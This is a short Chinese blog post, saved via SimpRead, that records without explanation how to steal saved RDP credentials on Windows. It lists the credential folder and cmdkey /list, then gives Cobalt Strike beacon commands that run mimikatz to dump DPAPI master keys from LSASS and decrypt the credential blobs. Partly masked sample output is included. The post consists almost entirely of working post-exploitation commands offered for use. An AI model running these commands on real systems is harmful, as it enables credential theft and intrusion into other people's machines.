\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[www.cnblogs.com\](https://www.cnblogs.com/-mo-/p/12210302.html)

这里只做记录，不做详解

Windows 保存 RDP 凭据的目录是：

```
C:\\Users\\用户名\\AppData\\Local\\Microsoft\\Credentials


```

可通过命令行获取，执行:

```
cmdkey /list或powerpick Get-ChildItem C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\ -Force


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200118212509938-579453874.png)

注意: cmdkey /list 命令务必在 Session 会话下执行，system 下执行无结果。

使用 cobalt strike 中的 mimikatz 可以获取一部分接下来要用到的 masterkey 和 pbData :

```
mimikatz dpapi::cred /in:C:\\Users\\USERNAME\\AppData\\Local\\Microsoft\\Credentials\\SESSIONID


```

输出应类似:

```
\*\*BLOB\*\*
  dwVersion : 00000001 - 1
  guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey : {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}
  dwFlags : 20000000 - 536870912 (system ; )
  dwDescriptionLen : 00000012 - 18
  szDescription : 本地凭据数据

  algCrypt : 00006610 - 26128 (CALG\_AES\_256)
  dwAlgCryptLen : 00000100 - 256
  dwSaltLen : 00000020 - 32
  pbSalt : 726d845b8a4eba29875\*\*\*\*10659ec2d5e210a48f
  dwHmacKeyLen : 00000000 - 0
  pbHmackKey :
  algHash : 0000800e - 32782 (CALG\_SHA\_512)
  dwAlgHashLen : 00000200 - 512
  dwHmac2KeyLen : 00000020 - 32
  pbHmack2Key : cda4760ed3fb1c7874\*\*\*\*28973f5b5b403fe31f233
  dwDataLen : 000000c0 - 192
  pbData : d268f81c64a3867cd7e96d99578295ea55a47fcaad5f7dd6678989117fc565906cc5a8bfd37137171302b34611ba5\*\*\*\*e0b94ae399f9883cf80050f0972693d72b35a9a90918a06d
  dwSignLen : 00000040 - 64
  pbSign : 63239d3169c99fd82404c0e230\*\*\*\*37504cfa332bea4dca0655


```

需要关注的是 guidMasterKey 、 pbData ， pbData 是我们要解密的数据， guidMasterKey 是解密所需要的密钥。

这里 LSASS 已经在其缓存中存有这个 key 因此我们可以使用 SeDebugPrivilege 获取:

```
beacon> mimikatz !sekurlsa::dpapi

\[00000001\]
     \* GUID : {0785cf41-0f53-4be7-bc8b-6cb33b4bb102}
     \* Time : 2020/1/3 8:05:02
     \* MasterKey : 02b598c2252fa5d8f7fcd\*\*\*7737644186223f44cb7d958148
     \* sha1(key) : 3e6dc57a0fe\*\*\*\*a902cfaf617b1322
     \[00000002\]
     \* GUID : {edcb491a-91d7-4d98-a714-8bc60254179f}
     \* Time : 2020/1/3 8:05:02
     \* MasterKey : c17a4aa87e9848e9f46c8ca81330\*\*\*79381103f4137d3d97fe202
     \* sha1(key) : 5e1b3eb1152d3\*\*\*\*6d3d6f90aaeb



```

然后将凭据保存到本地，执行:

```
mimikatz "dpapi::cred /in:C:\\Users\\USERNAME\\Desktop\\test\\SESSION /masterkey:对应的GUID key"


```

![](https://img2018.cnblogs.com/blog/1561366/202001/1561366-20200118212833644-569197071.png)